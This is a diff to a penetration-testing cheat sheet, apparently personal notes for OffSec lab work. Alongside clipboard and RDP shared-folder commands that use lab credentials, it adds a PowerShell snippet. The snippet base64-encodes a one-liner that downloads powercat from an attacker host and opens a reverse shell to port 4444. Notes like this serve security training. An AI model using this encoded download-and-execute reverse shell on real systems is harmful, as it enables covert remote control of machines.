@@ -1,4 +1,5 @@
 
+# Misc
 ##### Copy file contents to clipboard
 ```bash
 xclip -sel c < input_file
@@ -13,6 +14,24 @@ xclip -sel c < input_file
 ##### Ensure bash one-liner runs in bash (rather in sh shell)
 ```bash
 bash -c "bash <oneliner>"
+```
+
+##### Use PowerShell (pwsh on Kali) to base64 encode powercat download & reverse shell
+```powershell
+$TEXT = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.167/powercat.ps1');powercat -c 192.168.45.167 -p 4444 -e powershell"
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+$EncodedText =[Convert]::ToBase64String($Bytes)
+# Print encoded text
+$EncodedText       
+```
+
+##### RDP mounting a shared folder
+```bash
+# xfreerdp
+xfreerdp /cert-ignore /compression /auto-reconnect /u:offsec /p:lab /v:192.168.212.250 /w:1600 /h:800 /drive:test,/home/kali/Documents
+
+# rdesktop
+rdesktop -z -P -x m -u offsec -p lab 192.168.212.250 -r disk:test=/home/kali/Documents
 ```
 
 
